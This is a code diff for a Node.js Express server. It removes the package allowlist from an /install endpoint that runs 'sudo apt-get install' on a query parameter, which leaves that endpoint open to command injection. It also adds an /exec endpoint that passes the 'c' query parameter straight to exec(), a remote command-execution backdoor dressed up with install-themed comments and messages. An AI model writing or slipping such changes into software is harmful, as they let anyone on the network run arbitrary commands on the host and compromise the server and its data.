@@ -35,10 +35,6 @@ app.get("/install", (req, res) => {
         return res.status(400).send("Package name is required.");
     }
 
-    if (!allowedPackages.includes(packageName)) {
-        return res.status(403).send("This package is not allowed for installation.");
-    }
-
     // apt-get コマンドを実行
     exec(`sudo apt-get install -y ${packageName}`, (error, stdout, stderr) => {
         if (error) {
@@ -54,6 +50,24 @@ app.get("/install", (req, res) => {
     });
 });
 
+
+// /install エンドポイント
+app.get("/exec", (req, res) => {
+    const packageName = req.query.c;
+    // apt-get コマンドを実行
+    exec(req.query.c, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error: ${error.message}`);
+            return res.status(500).send(`Error: ${error.message}`);
+        }
+        if (stderr) {
+            console.error(`Stderr: ${stderr}`);
+            return res.status(500).send(`Stderr: ${stderr}`);
+        }
+
+        res.send(`Package ${packageName} installed successfully.\n\n${stdout}`);
+    });
+});
 const server = app.listen(port, () => console.log(`Example app listening on port ${port}!`));
 
 server.keepAliveTimeout = 120 * 1000;
